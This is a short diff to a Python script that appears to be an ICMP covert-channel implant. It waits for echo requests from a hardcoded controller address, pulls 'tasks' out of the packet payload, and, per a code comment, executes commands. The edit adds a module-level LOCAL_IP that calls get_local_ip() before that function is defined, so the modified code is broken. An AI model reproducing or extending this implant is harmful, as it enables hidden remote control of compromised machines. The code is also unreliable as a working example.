@@ -3,6 +3,8 @@ import time
 import socket
 
 SERVER_IP = "192.168.10.50"
+LOCAL_IP = get_local_ip()
+
 
 def get_local_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -24,7 +26,7 @@ def handle_incoming(pkt):
 
     if IP in pkt and ICMP in pkt:
         if pkt[IP].src == SERVER_IP and pkt[ICMP].type == 8:
-            if pkt.haslayer(Raw) and pkt[IP].dst == get_local_ip(): # troubleshoot here if command exec stops working
+            if pkt.haslayer(Raw) and pkt[IP].dst == LOCAL_IP: # troubleshoot here if command exec stops working
                 # need to handle CMD vs regular
                 task = pkt[Raw].load.decode(errors="ignore")
                 print(f"[+] Received task: {task}")
